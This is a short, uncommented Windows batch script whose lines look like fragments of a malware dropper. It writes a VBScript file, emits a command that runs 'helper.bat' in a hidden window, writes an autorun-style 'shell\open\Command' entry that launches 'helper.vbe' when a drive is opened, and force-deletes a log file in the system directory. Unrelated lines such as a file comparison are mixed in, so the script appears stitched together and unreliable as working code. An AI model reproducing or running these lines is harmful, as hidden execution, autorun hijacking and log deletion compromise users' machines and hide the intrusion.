@echo off
echo.Wscript.sleep 10000>sleep.vbe
echo.runner.run "helper.bat",0
fc "first.txt" second.txt
start "" %service%
echo.shell\open\Command=wscript.exe helper.vbe
del /a /f /q "%systemroot%\test.log"
